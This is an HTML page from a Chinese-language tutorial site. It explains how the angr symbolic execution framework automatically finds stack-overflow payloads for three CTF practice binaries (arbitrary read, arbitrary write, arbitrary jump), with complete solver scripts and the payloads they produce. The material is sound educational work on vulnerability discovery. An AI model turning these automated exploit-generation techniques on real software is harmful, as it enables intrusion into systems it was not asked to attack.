@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>08 angr overflow - My Docs</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css">
+
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">My Docs</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../.." class="nav-link">0x401RevTrain-Tools</a>
+                            </li>
+                            <li class="dropdown active">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Angr <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../00_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86/" class="dropdown-item">00 符号执行原理</a>
+</li>
+                                    
+<li>
+    <a href="../01_angr%E5%85%A5%E9%97%A8/" class="dropdown-item">01 angr入门</a>
+</li>
+                                    
+<li>
+    <a href="../02_angr_explore/" class="dropdown-item">02 angr explore</a>
+</li>
+                                    
+<li>
+    <a href="../03_angr_symbolic/" class="dropdown-item">03 angr symbolic</a>
+</li>
+                                    
+<li>
+    <a href="../04_angr_constraints/" class="dropdown-item">04 angr constraints</a>
+</li>
+                                    
+<li>
+    <a href="../05_angr_hooks/" class="dropdown-item">05 angr hooks</a>
+</li>
+                                    
+<li>
+    <a href="../06_angr_veritesting/" class="dropdown-item">06 angr veritesting</a>
+</li>
+                                    
+<li>
+    <a href="../07_angr_library/" class="dropdown-item">07 angr library</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active">08 angr overflow</a>
+</li>
+                                    
+<li>
+    <a href="../09_VEX%20IR/" class="dropdown-item">09 VEX IR</a>
+</li>
+                                    
+<li>
+    <a href="../10_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/" class="dropdown-item">10 利用angr符号执行去除控制流平坦化</a>
+</li>
+                                    
+<li>
+    <a href="../11_%E5%88%A9%E7%94%A8angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A2%AD%E5%93%88VM%E7%B1%BBCTF%E8%B5%9B%E9%A2%98/" class="dropdown-item">11 利用angr符号执行梭哈VM类CTF赛题</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Capstone <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../capstone/00_Capstone/" class="dropdown-item">00 Capstone</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../07_angr_library/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../09_VEX%20IR/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="2"><a href="#15_angr_arbitrary_read" class="nav-link">15_angr_arbitrary_read</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-level="2"><a href="#16_angr_arbitrary_write" class="nav-link">16_angr_arbitrary_write</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            
+            <li class="nav-item" data-level="2"><a href="#17_angr_arbitrary_jump" class="nav-link">17_angr_arbitrary_jump</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<p>这是angr_ctf系列的最后一节，在这一节我们通过三个栈溢出的例子来学习angr在漏洞挖掘方向的简单应用。</p>
+<h2 id="15_angr_arbitrary_read">15_angr_arbitrary_read</h2>
+<p>这是一个非常入门级的栈溢出题，程序逻辑如下：</p>
+<p><img alt="image-20211007094226454" src="../img/image-20211007094226454.png" /></p>
+<p>手动分析的思路非常简单，scanf处有一个任意读漏洞，可以通过scanf将s的地址覆盖为0x484F6038，使<code>puts(s)</code>能够打印"Good Jobs"：</p>
+<p><img alt="image-20211007094346598" src="../img/image-20211007094346598.png" /></p>
+<p>直接梭哈的话不太行，angr没有分析出这个栈溢出漏洞，原因可能是angr无法分析出"Good Job"来自哪个地址：</p>
+<pre><code class="language-python">import angr
+
+proj = angr.Project('../dist/15_angr_arbitrary_read')
+state = proj.factory.entry_state()
+simgr = proj.factory.simgr(state)
+simgr.explore(
+    find=lambda state : b'Good Job.' in state.posix.dumps(1),
+    avoid=lambda state: b'Try again.' in state.posix.dumps(1)
+)
+print(simgr.found[0].posix.dumps(0))    # 不行
+</code></pre>
+<p>该题是通过puts输出的，所以我们可以将判断输出中是否包含"Good Job."的条件改为，puts的参数是否为"Good Job."的地址，即0x484F6038。检测puts参数的代码如下，很好理解：</p>
+<pre><code class="language-python">def check_puts(state):
+    puts_parameter = state.memory.load(state.regs.esp + 4, 4, endness=proj.arch.memory_endness)
+    if state.solver.symbolic(puts_parameter):
+        good_job_string_address = 0x484F6038
+        is_vulnerable_expression = puts_parameter == good_job_string_address
+        copied_state = state.copy()
+        copied_state.add_constraints(is_vulnerable_expression)
+        if copied_state.satisfiable():
+            state.add_constraints(is_vulnerable_expression)
+            return True
+    return False
+</code></pre>
+<p>explore的条件is_successful：</p>
+<pre><code class="language-python">def is_successful(state):
+    puts_address = 0x08048370
+    if state.addr == puts_address:
+        return check_puts(state)
+    return False
+</code></pre>
+<p>程序的流程并不是很复杂，所以本题的关键还是在于给explore函数找到一个合适的判定条件。在自动化Pwn中，这个条件往往要改为执行到<code>system("/bin/sh")</code>。</p>
+<p>完整代码：</p>
+<pre><code class="language-python">import angr
+
+def check_puts(state):
+    puts_parameter = state.memory.load(state.regs.esp + 4, 4, endness=proj.arch.memory_endness)
+    if state.solver.symbolic(puts_parameter):
+        good_job_string_address = 0x484F6038
+        is_vulnerable_expression = puts_parameter == good_job_string_address
+        copied_state = state.copy()
+        copied_state.add_constraints(is_vulnerable_expression)
+        if copied_state.satisfiable():
+            state.add_constraints(is_vulnerable_expression)
+            return True
+    return False
+
+def is_successful(state):
+    puts_address = 0x08048370
+    if state.addr == puts_address:
+        return check_puts(state)
+    return False
+
+proj = angr.Project('../dist/15_angr_arbitrary_read')
+state = proj.factory.entry_state()
+simgr = proj.factory.simgr(state)
+simgr.explore(find=is_successful)
+print(simgr.found[0].posix.dumps(0))
+</code></pre>
+<p>输出：</p>
+<pre><code class="language-python">b'0041810812 \xd9\xd9\xd1\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd98`OH'
+</code></pre>
+<p>有一个要注意的地方是这里：</p>
+<pre><code class="language-python">puts_parameter = state.memory.load(state.regs.esp + 4, 4, endness=proj.arch.memory_endness)
+</code></pre>
+<p>的<code>endness=proj.arch.memory_endness</code>是指定读取的方式为小端。</p>
+<h2 id="16_angr_arbitrary_write">16_angr_arbitrary_write</h2>
+<p>这题的思路稍微比上题复杂一点，在这题中我们可以通过scanf将dest覆盖成任意地址，然后通过第二个strncpy向dest中保存的地址写入任何数据，因此我们可以向任何地址写入任何数据，这是一个任意写漏洞。首先我们将dest覆盖成password_buffer的地址，然后再通过第二个strncpy往dest中写入"PASSWORD"，最后输出"Good Job."：</p>
+<p><img alt="image-20211007101137899" src="../img/image-20211007101137899.png" /></p>
+<p><img alt="image-20211007101308229" src="../img/image-20211007101308229.png" /></p>
+<p>直接梭哈还是不行，原因可能是angr没有判断出password_buffer可以被覆盖为符号值。</p>
+<p>还是按照上题的思路，这回我们要check的是strncpy函数，约束条件为dest指向的地址为password_buffer，并且src为"NDYNWEUJ"，代码如下：</p>
+<pre><code class="language-python">def check_strncpy(state):
+    dest = state.memory.load(state.regs.esp + 4, 4, endness=proj.arch.memory_endness)
+    src = state.memory.load(state.regs.esp + 8, 4, endness=proj.arch.memory_endness)
+    src_content = state.memory.load(src, 8)
+    if state.solver.symbolic(src_content) and state.solver.symbolic(dest):
+        is_vulnerable_expression = claripy.And(src_content == b'NDYNWEUJ', dest == 0x57584344)
+        copied_state = state.copy()
+        copied_state.add_constraints(is_vulnerable_expression)
+        if copied_state.satisfiable():
+            state.add_constraints(is_vulnerable_expression)
+            return True
+    return False
+</code></pre>
+<p>完整代码：</p>
+<pre><code class="language-python">import angr
+import claripy
+
+def check_strncpy(state):
+    dest = state.memory.load(state.regs.esp + 4, 4, endness=proj.arch.memory_endness)
+    src = state.memory.load(state.regs.esp + 8, 4, endness=proj.arch.memory_endness)
+    src_content = state.memory.load(src, 8)
+    if state.solver.symbolic(src_content) and state.solver.symbolic(dest):
+        is_vulnerable_expression = claripy.And(src_content == b'NDYNWEUJ', dest == 0x57584344)
+        copied_state = state.copy()
+        copied_state.add_constraints(is_vulnerable_expression)
+        if copied_state.satisfiable():
+            state.add_constraints(is_vulnerable_expression)
+            return True
+    return False
+
+def is_successful(state):
+    strncpy_address = 0x08048410
+    if state.addr == strncpy_address:
+        return check_strncpy(state)
+    return False
+
+proj = angr.Project('../dist/16_angr_arbitrary_write')
+state = proj.factory.entry_state()
+simgr = proj.factory.simgr(state)
+simgr.explore(find=is_successful)
+print(simgr.found[0].posix.dumps(0))
+</code></pre>
+<p>输出：</p>
+<pre><code class="language-python">b'0011604995 NDYNWEUJ\xd9\xd9\xd9\xd9\xd9\xd1\xd9\xd9DCXW'
+</code></pre>
+<h2 id="17_angr_arbitrary_jump">17_angr_arbitrary_jump</h2>
+<p>非常经典的ROP，可以覆盖返回值实现任意跳转：</p>
+<p><img alt="image-20211007104740278" src="../img/image-20211007104740278.png" /><img alt="image-20211007104749105" src="../img/image-20211007104749105.png" /></p>
+<p>当一个指令有很多分支的可能性时，称之为不受约束（unconstrained）的状态， 比如说当用户的输入决定下一条指令的位置。angr 在遇到不受约束的状态时会将其抛出，本题将要关闭这个默认行为，转而利用此状态去求解能够跳转到print_good函数的payload。</p>
+<p>求解步骤：</p>
+<ul>
+<li>初始化proj，让 angr 记录不受约束的状态</li>
+<li>开始step直到发现 eip 为符号的状态</li>
+<li>约束 eip 与 print_good 函数地址相同</li>
+<li>约束求解</li>
+</ul>
+<p>完整exp：</p>
+<pre><code class="language-python">import angr
+import claripy
+
+proj = angr.Project('../dist/17_angr_arbitrary_jump')
+payload = claripy.BVS('payload', 64 * 8)
+state = proj.factory.entry_state(stdin=payload)
+simgr = proj.factory.simgr(
+    state, 
+    save_unconstrained=True, 
+    stashes={
+        'active':[state],
+        'unconstrained': [],
+        'found': [],
+    })
+while (len(simgr.active) or len(simgr.unconstrained)) and not len(simgr.found):
+    for unconstrained in simgr.unconstrained:
+        eip = unconstrained.regs.eip
+        print_good_addr = 0x42585249
+        if unconstrained.satisfiable(extra_constraints=[eip == print_good_addr]):
+            unconstrained.add_constraints(eip == print_good_addr)
+            simgr.move('unconstrained', 'found')
+            break
+    simgr.drop(stash=&quot;unconstrained&quot;)
+    simgr.step()
+
+print(simgr.found[0].posix.dumps(0))
+</code></pre>
+<p>输出：</p>
+<pre><code class="language-python">b'\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xda\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdbIRXB\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\x00\x00\x00\x00\x00'
+</code></pre>
+<p>打印unconstrained状态，可以发现其地址是由输入决定的：</p>
+<pre><code class="language-python">&gt;&gt;&gt; unconstrained
+&lt;SimState @ &lt;BV32 payload_0_512[199:192] .. payload_0_512[207:200] .. payload_0_512[215:208] .. payload_0_512[223:216]&gt;&gt;
+</code></pre>
+<p>所以我们对eip进行约束求解，就能找到会导致栈溢出的payload。</p></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js" defer></script>
+        <script src="../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
